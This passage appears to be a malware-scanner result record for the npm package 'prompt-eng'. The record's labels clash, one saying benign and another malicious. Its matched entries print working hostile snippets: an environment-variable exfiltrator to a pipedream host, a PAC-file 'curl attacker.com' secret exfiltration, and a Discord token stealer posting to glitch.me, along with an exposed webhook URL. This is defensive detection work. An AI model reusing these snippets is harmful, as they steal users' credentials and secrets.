@@ -1,0 +1,977 @@
+{
+  "package_name": "prompt-eng",
+  "package_version": "1.0.49",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:36:58.431034",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/bin/prompt.js",
+    "package/bin/queue.js"
+  ],
+  "is_malicious": true,
+  "total_files": 3,
+  "malicious_files": 1,
+  "total_slices": 2,
+  "malicious_slices": 1,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/prompt-eng/1.0.49/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/prompt-eng/1.0.49/package/bin/prompt.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "prompt_slice_1",
+          "code_snippet": "require(\"dotenv\").config();\nconst fs = require(\"fs\");\nconst md5 = require(\"md5\");\nconst { Queue } = require(\"./queue\");\n\nexports.PromptProxy = class PromptProxy {\n  static isInterval = false;\n  static queue = new Queue();\n\n  constructor(\n    openai,\n    {\n      serverURI = process.env.PROMPT_SRV_URI,\n      logger = console,\n      path,\n      env = process.env.NODE_ENV,\n      MAX_QUEUE_SIZE = 100,\n      isDisabled = false,\n    } = {}\n  ) {\n    this.logger = logger;\n    this.openai = openai;\n    this.cache = {};\n    this.serverURI = serverURI;\n    if (env) {\n      process.env.NODE_ENV = env;\n    }\n    this.MAX_QUEUE_SIZE = MAX_QUEUE_SIZE;\n    this.isDisabled = isDisabled;\n    this._setPath(path);\n  }\n\n  _setActive(flag) {\n    this.isDisabled = !flag;\n\n    if (flag) {\n      this.logger.info(\"Caching enabled\");\n      this._initInterval();\n    } else {\n      this.logger.info(\"Caching disabled\");\n      clearInterval(Queue.interval);\n    }\n  }\n\n  _setPath(path) {\n    if (!path && process.env.NODE_ENV === \"dev\") {\n      if (!fs.existsSync(\"./.prompts_cache.json\")) {\n        fs.appendFileSync(\"./.prompts_cache.json\", JSON.stringify({}));\n      }\n      this.path = \"./.prompts_cache.json\";\n    } else {\n      this.path = path;\n    }\n  }\n\n  _initInterval() {\n    if (!PromptProxy.isInterval && !this.isDisabled) {\n      PromptProxy.isInterval = true;\n      Queue.setQueueInterval(PromptProxy, this.serverURI, this.MAX_QUEUE_SIZE);\n    }\n  }\n\n  _initCache() {\n    if (!fs.existsSync(this.path)) {\n      this.logger.error(\"The path to the cache isn't correct\", this.path);\n      throw new Error(\"The path to the cache isn't correct \" + this.path);\n    }\n\n    try {\n      this.cache = JSON.parse(fs.readFileSync(this.path));\n    } catch (error) {\n      this.logger.error(\"Cache file is corrupted, initiating file...\");\n      this.cache = {};\n    }\n  }\n\n  _getCachePrompt(data) {\n    if (Object.keys(this.cache) == 0) {\n      this._initCache();\n    }\n\n    const hash = md5(JSON.stringify(data));\n    if (!this.cache[hash]) {\n      return { hashedCache: null, hash };\n    }\n\n    return { hashedCache: this.cache[hash], hash };\n  }\n\n  _setCachePrompt(data, response) {\n    const { hash } = this._getCachePrompt(data);\n    this.cache[hash] = response;\n\n    fs.writeFileSync(this.path, JSON.stringify(this.cache));\n  }\n\n  async createChatCompletion(props) {\n    this._initInterval();\n    let propsPos = { ...props, prompt: props.messages };\n\n    if (process.env.NODE_ENV === \"dev\" && !this.isDisabled) {\n      const { hashedCache, hash } = this._getCachePrompt(props);\n\n      if (hashedCache !== null) {\n        hashedCache.cache = true;\n        return hashedCache;\n      }\n      const startTime = new Date();\n      const result = await this.openai.chat.completions.create({ ...props });\n\n      const endTime = new Date();\n      const responseTime = endTime - startTime;\n\n      const { choices } = result;\n\n      this._setCachePrompt(props, { choices });\n\n      propsPos = {\n        ...propsPos,\n        response: { choices },\n        responseTime,\n        hash,\n      };\n      PromptProxy.queue.enqueue({ ...propsPos });\n      return result;\n    }\n    const startTime = new Date();\n    const result = await this.openai.chat.completions.create({ ...props });\n\n    const endTime = new Date();\n    const responseTime = endTime - startTime;\n\n    const { choices } = result;\n\n    const hash = md5(JSON.stringify(props.messages));\n\n    propsPos = {\n      ...propsPos,\n      response: { choices },\n      responseTime,\n      hash,\n    };\n    PromptProxy.queue.enqueue({ ...propsPos });\n\n    return result;\n  }\n\n  async createCompletion(props) {\n    this._initInterval();\n    let propsPos = { ...props };\n\n    if (process.env.NODE_ENV === \"dev\" && !this.isDisabled) {\n      const { hashedCache, hash } = this._getCachePrompt(props);\n\n      if (hashedCache !== null) {\n        return hashedCache;\n      }\n      const startTime = new Date();\n      const result = await this.openai.completions.create({\n        ...props,\n      });\n\n      const endTime = new Date();\n      const responseTime = endTime - startTime;\n\n      const { choices } = result;\n\n      this._setCachePrompt(props, { choices });\n\n      propsPos = {\n        ...propsPos,\n        response: { choices },\n        responseTime,\n        hash,\n      };\n      PromptProxy.queue.enqueue({ ...propsPos });\n      return result;\n    }\n\n    const startTime = new Date();\n    const result = await this.openai.completions.create({\n      ...props,\n    });\n\n    const endTime = new Date();\n    const responseTime = endTime - startTime;\n\n    const { choices } = result;\n\n    const hash = md5(JSON.stringify(props.prompt));\n    propsPos = {\n      ...propsPos,\n      response: { choices },\n      responseTime,\n      hash,\n    };\n    PromptProxy.queue.enqueue({ ...propsPos });\n    return result;\n  }\n};",
+          "is_malicious": false,
+          "malice_score": 0.565406064192454,
+          "confidence": 0.3,
+          "behavior_summary": "When called, the code accesses environment variables including PROMPT_SRV_URI and NODE_ENV, reads and writes to a local cache file (./.prompts_cache.json) using fs APIs, and performs cryptographic hashing with md5 on input data. It sends data to an external server URI (from PROMPT_SRV_URI) via the Queue.setQueueInterval method and enqueues request/response data, facilitating potential data exfiltration or telemetry to a remote server. The code also conditionally caches OpenAI API responses and manages cache persistence, enabling data leakage or unauthorized data transmission depending on the serverURI environment variable.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements a caching proxy for OpenAI API calls, using environment variables for configuration, local file system caching, and hashing of request data. It enqueues request/response data to a queue that is periodically flushed to a remote server URI specified by an environment variable. While this behavior could theoretically be abused for data exfiltration if the serverURI is malicious, the code itself does not contain obfuscation, direct exfiltration of environment variables, or embedding of secrets into prompts as seen in the known malicious patterns. The use of environment variables and network communication is legitimate for configurable telemetry or caching services. The code does not access or send all environment variables, nor does it embed secrets into prompts. The queue and interval mechanism is a common pattern for batching telemetry or logs. Therefore, although the code has some suspicious elements (sending cached data to a remote server), it lacks clear malicious intent or direct evidence of data theft or secret leakage. This results in a low confidence suspicion rating.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104205_631146_snippet_3",
+              "source_package": "N/A (OWASP Top 10 for LLM Applications Guidance) (N/A)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104205_631146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.6211382150650024,
+              "code_similarity": 0.5523753762245178,
+              "behavior_similarity": 0.6899009943008423,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode for system prompt leakage\nsystemPrompt = 'You are a helpful assistant. API_KEY=' + process.env.API_KEY;\nuserPrompt = getUserPrompt();\nfinalPrompt = systemPrompt + userPrompt;\nresponse = LLM.generate(finalPrompt);",
+                "code_behavior": "At runtime, the code constructs a system prompt by concatenating a static string with the value of process.env.API_KEY, then appends the userPrompt and sends the combined prompt to LLM.generate, risking exposure of sensitive secrets if the prompt is ever returned or leaked.",
+                "malice_analysis": {
+                  "why_suspicious": "Embedding secrets such as API keys in prompts exposes them to potential leakage if the prompt is logged, returned to the user, or otherwise exposed, enabling credential theft and further compromise.",
+                  "violated_expectations": "System prompts must never include sensitive information; secrets should be handled securely and never incorporated into model input or user-facing content.",
+                  "similar_legitimate_use": "There is no legitimate use case for embedding secrets in prompts; this practice is always a security risk.",
+                  "key_indicators": [
+                    "Inclusion of environment variables or secrets in prompt construction",
+                    "Concatenation of sensitive data with user-accessible prompt content",
+                    "Potential for prompt content to be exposed to users or logs"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (system prompt construction)",
+                  "file_location": "LLM application prompt builder",
+                  "required_permissions": [
+                    "environment_vars",
+                    "application secrets"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (OWASP Top 10 for LLM Applications Guidance)",
+                  "package_manager": "N/A",
+                  "package_versions": "N/A",
+                  "why_malicious": "This report does not describe a specific malicious package, but outlines new classes of software risks and vulnerabilities for large language model (LLM) applications, including unbounded resource consumption, vector/embedding attacks, system prompt leakage, and excessive agency. These risks can be exploited by attackers to cause denial of service, financial loss, data leakage, model theft, and unauthorized actions. The guidance highlights how insecure LLM application design can introduce exploitable behaviors that attackers can leverage to compromise confidentiality, integrity, and availability."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends repeated or crafted queries to the LLM application, triggering unbounded inference and resource consumption.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service degradation, denial of service, or financial loss."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker manipulates vector/embedding queries to inject malicious content or retrieve sensitive context.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Model output manipulation or data leakage."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker exploits prompt leakage to obtain sensitive information embedded in system prompts.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential or secret exposure, enabling further attacks."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages excessive agency in LLM agentic systems to trigger unauthorized or destructive actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data loss, financial theft, or system compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusually high volume of LLM inference requests from a single user or IP address, indicating potential abuse of unbounded inference loops",
+                    "Direct use of unsanitized user input in vector or embedding retrieval functions, observable in code or runtime logs",
+                    "Presence of sensitive information (e.g., API keys, secrets) in prompt construction or application logs",
+                    "LLM agentic systems executing high-risk actions (e.g., file deletion, fund transfer) without human approval or policy enforcement"
+                  ],
+                  "file_indicators": [
+                    "Prompt templates or code files containing references to environment variables or secrets in prompt construction (e.g., process.env.API_KEY)",
+                    "Agent orchestration logic lacking explicit permission or policy checks before executing sensitive actions",
+                    "Vector database query code that directly incorporates user input without validation or sanitization"
+                  ],
+                  "network_indicators": [
+                    "Excessive outbound requests to LLM APIs from a single user or session",
+                    "Unexpected data exfiltration to external endpoints following LLM prompt construction or agentic actions",
+                    "Unusual API calls or transactions (e.g., fund transfers, file deletions) triggered by LLM agentic decisions"
+                  ],
+                  "how_to_detect": "Implement runtime monitoring to detect anomalous LLM inference activity, such as high-frequency requests from individual users. Use static analysis to identify code patterns where user input is used directly in vector or context retrieval, or where environment variables/secrets are included in prompt construction. Scan agent orchestration logic for absence of permission or policy checks before sensitive actions. Correlate network logs for unexpected outbound requests or data exfiltration following LLM operations. Regularly audit application logs for evidence of prompt leakage or unauthorized agentic actions."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102818_710202_snippet_1",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102818_710202/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5438340902328491,
+              "code_similarity": 0.4491427540779114,
+              "behavior_similarity": 0.6385254859924316,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var data = process.env || {};\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}\nvar req = http.request({\n  host: ['eoxb1lay4m45mms', 'm', ['pip', 'edream'].join(''), 'net'].join('.'),\n  path: '/' + (data.npm_package_name || ''),\n  method: 'POST',\n});\nreq.write(Buffer.from(JSON.stringify(data).toString('base64')));\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code collects all environment variables from process.env, checks for sandbox indicators using a filter, and if not detected, exfiltrates the environment data via a POST request to a dynamically constructed, attacker-controlled domain, resulting in credential and secret theft.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses all environment variables and exfiltrates them to an external, obfuscated domain without user consent. The use of dynamic hostname construction and base64 encoding, combined with conditional logic to avoid sandboxes, is characteristic of data theft malware.",
+                  "violated_expectations": "Legitimate packages do not exfiltrate environment variables or send sensitive data to external webhooks, especially not at import-time or without explicit user consent. Telemetry or error reporting would be opt-in, clearly documented, and not obfuscated.",
+                  "similar_legitimate_use": "Some legitimate packages may collect environment data for debugging or telemetry, but only with user consent and transparent documentation. They do not obfuscate hostnames or exfiltrate all environment variables.",
+                  "key_indicators": [
+                    "Access to process.env and exfiltration of all environment variables",
+                    "Obfuscated and dynamically constructed webhook host using string concatenation",
+                    "Base64 encoding of exfiltrated data",
+                    "Network POST request to attacker-controlled domain at import-time",
+                    "Conditional logic to avoid execution in sandboxes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (main entry point in malicious versions)",
+                  "required_permissions": [
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
+                  "why_malicious": "Multiple versions of the package exfiltrate all environment variables to an attacker-controlled webhook, use obfuscated and dynamically constructed hostnames, and implement sandbox evasion techniques to avoid detection. The latest version (0.1.0) is benign to bypass security scanners, while the majority of versions are malicious and designed for dependency confusion attacks targeting build and CI/CD environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion, leveraging high minor/patch version numbers to supersede internal packages.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on the victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, the code checks environment variables for known sandbox, CI/CD, or analysis indicators to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox or analysis environment, proceeds to data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collects all environment variables from the victim machine using process.env.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prepares sensitive data for exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrates the collected environment variables to an attacker-controlled webhook using a POST request to a dynamically constructed subdomain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive credentials and secrets from the victim environment"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to process.env and exfiltration of all environment variables to external domains",
+                    "Network POST requests to dynamically constructed subdomains of pipedream.net at import-time or runtime",
+                    "Conditional logic to evade sandboxes or CI/CD environments based on environment variable checks",
+                    "Obfuscated or programmatically constructed hostnames and filter lists in JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "build.js containing both process.env access and http.request usage",
+                    "Obfuscated or minified code in non-production npm packages",
+                    "Presence of large, programmatically constructed filter lists for environment variable checks in build.js"
+                  ],
+                  "network_indicators": [
+                    "*.m.pipedream.net",
+                    "POST requests to subdomains such as eoxb1lay4m45mms.m.pipedream.net"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access all environment variables and send them to external domains, especially at import-time or during installation. Flag packages with obfuscated or dynamically constructed code, large environment variable filter lists, or network requests to known exfiltration domains such as *.m.pipedream.net. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate build.js file contents with suspicious network activity."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104218_627233_snippet_3",
+              "source_package": "N/A (OWASP Top 10 for LLM Applications Guidance) (N/A)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_104218_627233/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5383143424987793,
+              "code_similarity": 0.44872093200683594,
+              "behavior_similarity": 0.6279078125953674,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode for system prompt leakage\nsystemPrompt = 'You are a helpful assistant. API_KEY=' + secretApiKey;\nresponse = LLM.generate(systemPrompt + userPrompt);\nreturn response;",
+                "code_behavior": "At runtime (system prompt construction), the code embeds sensitive information such as API keys into the system prompt, which is then concatenated with user input and passed to the LLM, risking exposure of secrets if the prompt or its content is leaked to users or attackers.",
+                "malice_analysis": {
+                  "why_suspicious": "Embedding secrets or sensitive configuration data in prompts exposes them to potential leakage through LLM outputs, especially if prompt content is revealed or can be extracted by adversarial queries.",
+                  "violated_expectations": "System prompts must never contain secrets or sensitive data; secrets should be managed via secure channels and never exposed to the LLM context.",
+                  "similar_legitimate_use": "There is no legitimate use case for embedding secrets in prompts; all secrets should be handled securely and separately from prompt construction.",
+                  "key_indicators": [
+                    "Secrets or API keys concatenated into prompt strings",
+                    "Prompt content not isolated from user-accessible output",
+                    "Potential for prompt leakage and secret exposure"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (system prompt construction)",
+                  "file_location": "Prompt engineering logic (backend or API layer)",
+                  "required_permissions": [
+                    "access to sensitive configuration or secrets"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (OWASP Top 10 for LLM Applications Guidance)",
+                  "package_manager": "N/A",
+                  "package_versions": "N/A",
+                  "why_malicious": "This report does not analyze a specific software package, but instead details new classes of vulnerabilities and attack patterns relevant to large language model (LLM) applications. These include unbounded resource consumption, vector/embedding attacks, system prompt leakage, and excessive agency. If exploited, these risks can result in denial of service, financial loss, data leakage, model theft, and unauthorized actions by LLM-based agents, representing significant threats to LLM application security."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends repeated or crafted requests to the LLM application, triggering unbounded inference and resource consumption.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service degradation, denial of service, or excessive financial cost."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker injects malicious vectors or embeddings into the RAG pipeline or embedding store.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Manipulation of LLM outputs, data poisoning, or exfiltration of sensitive information."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker exploits prompt leakage to extract system prompts containing sensitive data or instructions.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exposure of secrets, internal logic, or further attack vectors."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages excessive agency in LLM agents to trigger unauthorized or risky actions.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data loss, financial theft, or system compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unusually high volume of inference requests from a single user or IP, indicating potential abuse of unbounded inference endpoints",
+                    "Unvalidated or unsanitized vectors/embeddings being stored or retrieved in the embedding store, suggesting possible poisoning attempts",
+                    "System prompts containing secrets or sensitive configuration data, detectable via prompt construction audits or output analysis",
+                    "LLM agents performing sensitive actions (e.g., file deletion, fund transfer) without human approval or explicit permission checks"
+                  ],
+                  "file_indicators": [
+                    "Embedding store files containing unexpected, malformed, or adversarial vectors",
+                    "Prompt logs or debug files containing API keys, secrets, or sensitive configuration data",
+                    "Agent orchestration scripts or configuration files lacking permission or approval checks for sensitive actions"
+                  ],
+                  "network_indicators": [
+                    "Excessive API calls to LLM inference endpoints from a single source",
+                    "Unusual outbound requests or transactions initiated by LLM agent actions (e.g., file deletions, fund transfers)",
+                    "Data exfiltration patterns or anomalous responses following prompt leakage or embedding attacks"
+                  ],
+                  "how_to_detect": "Continuously monitor for excessive or anomalous inference requests per user or IP, enforce validation and sanitization of all vectors/embeddings before storage, audit prompt construction logic for embedded secrets, and require strict permission checks and human-in-the-loop controls for all LLM agent-initiated sensitive actions. Set up alerts for any system prompt content containing secrets, and flag agentic actions that bypass explicit approval or permission workflows."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103502_807501_snippet_1",
+              "source_package": "pac-resolver (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_103502_807501/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5303899049758911,
+              "code_similarity": 0.46847230195999146,
+              "behavior_similarity": 0.592307448387146,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "function FindProxyForURL(url, host) { require('child_process').exec('curl http://attacker.com/?data=' + process.env.SECRET); return 'DIRECT'; }",
+                "code_behavior": "At runtime, when the PAC file is evaluated by pac-resolver, the code uses require to import the child_process module, executes an OS command (curl) that reads the SECRET environment variable and sends it to an attacker-controlled server, resulting in exfiltration of sensitive data and returning a proxy directive.",
+                "malice_analysis": {
+                  "why_suspicious": "The PAC file contains code that imports Node.js built-in modules and executes system commands, which is highly abnormal and dangerous for PAC logic. PAC files are only expected to contain proxy selection logic, not arbitrary code execution or OS-level operations.",
+                  "violated_expectations": "Normal PAC file evaluation should be strictly sandboxed, preventing access to Node.js modules and system resources. This code violates those expectations by escaping the sandbox and invoking child_process to execute arbitrary commands.",
+                  "similar_legitimate_use": "There is no legitimate scenario where a PAC file should import Node.js modules or execute OS commands. PAC files should only contain logic for determining proxy usage based on URL and host.",
+                  "key_indicators": [
+                    "Presence of require('child_process') or similar imports in PAC file",
+                    "Use of child_process.exec or similar functions within PAC logic",
+                    "Access to process.env or other Node.js process APIs from PAC evaluation context",
+                    "Outbound network requests initiated from PAC file evaluation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when a PAC file is loaded and evaluated by pac-resolver in a Node.js application",
+                  "file_location": "User-supplied PAC file content processed by pac-resolver",
+                  "required_permissions": [
+                    "filesystem (to access process.env and potentially other resources)",
+                    "network (to send outbound requests)",
+                    "process execution (to run OS commands via child_process)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "pac-resolver",
+                  "package_manager": "npm",
+                  "package_versions": "<5.0.0",
+                  "why_malicious": "The package is not intentionally malicious, but it contains a critical vulnerability (CVE-2021-23406) that allows remote attackers to execute arbitrary code by supplying a malicious PAC file. The vulnerability arises from unsafe evaluation of PAC file content, which permits untrusted JavaScript code to escape the intended sandbox and access Node.js built-in modules, enabling execution of system commands and exfiltration of sensitive data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker provides a malicious PAC file containing arbitrary JavaScript code that imports Node.js modules and executes system commands.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The PAC file is loaded and evaluated by pac-resolver in the target Node.js application, bypassing intended sandbox restrictions."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code in the PAC file escapes the JavaScript sandbox and executes OS commands, such as exfiltrating environment variables via network requests.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is exfiltrated to an attacker-controlled server or arbitrary code is executed on the victim system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "PAC file logic invoking require or process APIs during evaluation",
+                    "Execution of child_process or other Node.js built-in modules from PAC evaluation context",
+                    "Unexpected outbound network requests originating from PAC file evaluation"
+                  ],
+                  "file_indicators": [
+                    "PAC files containing require('child_process'), require('fs'), or similar Node.js module imports",
+                    "PAC files with code patterns such as exec(), spawn(), or direct access to process.env"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP or HTTPS requests to external domains during PAC file evaluation",
+                    "Network traffic to attacker-controlled domains or IPs triggered by proxy resolution logic"
+                  ],
+                  "how_to_detect": "Scan PAC files for the presence of Node.js module imports (e.g., require statements), usage of process APIs, or system command execution functions such as exec() or spawn(). Monitor for unexpected outbound network requests initiated during PAC file evaluation. Audit applications using pac-resolver versions prior to 5.0.0 for untrusted PAC file input and upgrade to a version that enforces secure sandboxing."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_214546_221899_snippet_1",
+              "source_package": "discord-lofy (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_214546_221899/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5243406891822815,
+              "code_similarity": 0.46766185760498047,
+              "behavior_similarity": 0.5810195207595825,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "let-pkkR;!function(){const-Q6SG=Array.prototype.slice.c... (obfuscated, >4000 lines)\npaths = ['/Users/user/AppData/Roaming/Discord/Local Storage/leveldb', ...];\npaths.forEach(p => getToken(p))\nfunction getToken(p) {\n    fs.readdir(p, (e, f) => {\n        if (f) {\n            f = f.filter(f => f.endsWith(\"ldb\"))\n            f.forEach(f => {\n                var fileContent = fs.readFileSync(`${p}/${f}`).toString()\n                var noMFA = /\"[\\d\\w_-]{24}\\.[\\d\\w_-]{6}\\.[\\d\\w_-]{27}\"/\n                var mfa = /\"mfa\\.[\\d\\w_-]{84}\"/\n                var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]\n                if (token) fetch(\"http://ip-api.com/json/\").then(r => r.json()).then(r => fetch('https://aba45cf.glitch.me/polarlindo', {\n                    method: \"POST\",\n                    body: JSON.stringify({\n                        token: token,\n                        ip: r.query\n                    })\n                }))\n            })\n        }\n    })\n}",
+                "code_behavior": "At runtime, the code iterates over browser and Discord client local storage folders, reads LevelDB files, extracts Discord authentication tokens using regular expressions, and sends the tokens along with the victim's public IP address to a hardcoded external server via HTTP POST, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses local storage folders associated with Discord and browsers, searches for token patterns using regex, and exfiltrates the results to an external server. This behavior is not present in legitimate libraries and is a clear sign of credential theft.",
+                  "violated_expectations": "A legitimate discord.js library should not access or parse local storage files for tokens, nor transmit sensitive authentication data to external servers.",
+                  "similar_legitimate_use": "Legitimate software may access local storage for user settings, but never for extracting and exfiltrating authentication tokens.",
+                  "key_indicators": [
+                    "Obfuscated code injected into a core library file",
+                    "Enumeration of Discord and browser storage paths",
+                    "Regex patterns matching Discord token formats",
+                    "Network POST requests to hardcoded attacker-controlled domain (aba45cf.glitch.me)",
+                    "Collection and exfiltration of public IP address"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "src/client/actions/UserGet.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "discord-lofy",
+                  "package_manager": "npm",
+                  "package_versions": "11.5.1",
+                  "why_malicious": "The package is a trojanized version of the legitimate discord.js library, containing heavily obfuscated code that steals Discord authentication tokens and other sensitive data from local storage, exfiltrates them to attacker-controlled infrastructure, and in some variants provides remote access and command execution capabilities. This enables credential theft, account takeover, and full system compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious npm package, often as a result of typosquatting or dependency confusion attacks.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code is introduced and set up to execute within the victim's environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time or runtime, harvesting sensitive data such as Discord tokens, environment variables, credentials, and personally identifiable information (PII).",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Stolen data is collected and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The harvested data is exfiltrated to attacker-controlled infrastructure, including custom servers, Discord webhooks, and pipedream.net endpoints.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker receives sensitive data, enabling account takeover, further attacks, or resale of credentials."
+                  },
+                  {
+                    "step": 4,
+                    "action": "For variants with remote access trojan (RAT) functionality, the attacker may issue further commands for remote control, data theft, persistence, or lateral movement.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full compromise of the victim system, including remote command execution and ongoing attacker access."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of obfuscated code in npm packages, especially in core library files or unexpected locations",
+                    "Access to browser or Discord client local storage folders and LevelDB files",
+                    "Use of regular expressions matching Discord token formats",
+                    "Network requests to hardcoded external domains or Discord webhooks for data exfiltration",
+                    "Exfiltration of environment variables or credentials, often base64-encoded",
+                    "Presence of remote access or shell execution command handlers integrated with Discord chat"
+                  ],
+                  "file_indicators": [
+                    "src/client/actions/UserGet.js containing obfuscated or injected code",
+                    "eval(function(p,a,c,k,e,d)... patterns in main package files",
+                    "References to Discord client storage paths (e.g., AppData/Roaming/Discord/Local Storage/leveldb)",
+                    "Obfuscated code blocks in wafer-* or similar package families"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to aba45cf.glitch.me/polarlindo",
+                    "HTTP POST requests to canary.discord.com/api/webhooks/903018156283551775/lJOJ9526e_rzw0Js2DQPdV0eYQd5RQybtUcJqolp84JTwlxJxaWnuam9FyUplYN2TJfT",
+                    "HTTP POST requests to *.m.pipedream.net (e.g., a5eb7b362adc824ed7d98433d8eae80a.m.pipedream.net)",
